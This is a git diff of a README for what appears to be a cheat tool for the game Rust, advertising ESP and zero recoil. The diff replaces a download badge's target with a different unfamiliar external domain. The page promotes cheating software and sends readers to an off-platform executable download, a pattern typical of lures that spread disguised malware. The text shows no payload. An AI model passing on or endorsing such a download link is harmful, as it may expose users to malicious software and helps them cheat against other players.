@@ -49,7 +49,7 @@ A: Yes — zero recoil on AK-47, LR-300, and MP5.
 
 **Monthly downloads:** 1.7m+
 
-[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/rustesp26)
+[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/rustesp26)
 
 ---
 
